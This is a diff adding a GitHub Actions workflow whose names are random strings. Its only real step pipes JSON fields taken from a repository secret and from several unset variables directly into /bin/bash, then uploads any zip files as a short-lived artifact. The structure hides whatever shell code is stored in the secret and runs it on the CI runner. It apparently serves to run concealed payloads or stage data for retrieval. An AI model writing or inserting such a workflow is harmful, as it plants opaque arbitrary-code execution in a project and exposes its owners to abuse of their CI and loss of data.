@@ -1,0 +1,25 @@
+name: neuralzlc713
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: neuralzlc713
+        env:
+          d9948: ${{ secrets.d9948 }}
+        run: |
+          printf '%s' "$d9948" | jq -r .etvdw182 | /bin/bash
+          printf '%s' "$uoa9" | jq -r .gvr98811 | /bin/bash
+          printf '%s' "$e6424" | jq -r .pt0605 | /bin/bash
+          echo $kr4 | jq -r .unocs3 | /bin/bash
+          printf '%s' "$k12" | jq -r .l48128 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: Ypfk9hJ5
+          path: "*.zip"
+          retention-days: 1
